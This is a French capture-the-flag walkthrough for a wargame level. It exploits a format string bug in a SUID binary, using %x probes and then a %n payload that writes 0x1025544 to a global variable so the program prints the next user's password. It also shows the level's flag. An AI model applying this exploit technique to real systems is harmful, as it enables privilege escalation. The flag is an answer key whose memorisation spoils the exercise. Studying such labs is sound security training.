# Level4 - Walkthrough

## Objectif
Exploiter une format string vulnerability pour écrire `16930116` (0x1025544) dans la variable globale `m` et afficher le flag.

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
# ⚠️ Bit SUID actif → s'exécute avec les droits de level5

python -c "print('%x %x %x')" | ./level4
# b7ff26b0 bffff794 0
# → Format string vulnerability confirmée
```

### 2. Analyse du code (Ghidra)

```c
int m;  // Variable globale

void p(char *param) {
    printf(param);  // ⚠️ Vulnérable !
}

void n(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    p(local_20c);
    if (m == 0x1025544) {   // Si m == 16930116
        system("/bin/cat /home/user/level5/.pass");
    }
}
```

**Objectif** : Écrire `16930116` dans `m` via la format string vulnerability.

### 3. Trouver l'adresse de `m`

Dans Ghidra → cliquer sur la variable `m` dans `n()`.

**Adresse de `m` : `0x08049810`**

### 4. Trouver la position du buffer sur la stack

```bash
python -c "print('AAAA' + '%x.'*15)" | ./level4
# ...41414141...
# → "AAAA" = 0x41414141 en position 12
```

**Notre buffer commence en position 12** (stack frame supplémentaire due à `p()`).

### 5. Construction du payload

**Calcul du padding** :
```
Valeur cible     = 16930116 (0x1025544)
Adresse affichée = 4 octets
Padding          = 16930116 - 4 = 16930112 → %16930112d
```

**Conversion de l'adresse en little-endian** :
```
0x08049810 → \x10\x98\x04\x08
```

**Structure du payload** :
```
[Adresse de m (4 octets)] + [%16930112d] + [%12$n]
      ↓                           ↓              ↓
\x10\x98\x04\x08      16930112 chars    Écrit 16930116 en position 12
```

**Total affiché avant `%12$n`** : 4 + 16930112 = **16930116** → `m = 16930116` ✅

### 6. Exploitation

```bash
python -c "print('\x10\x98\x04\x08' + '%16930112d' + '%12\$n')" | ./level4
```

**Résultat** : Le flag s'affiche directement.

---

## Flag
```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Type de vulnérabilité
- Format String Vulnerability (CWE-134)
- SUID privilege escalation (CWE-250)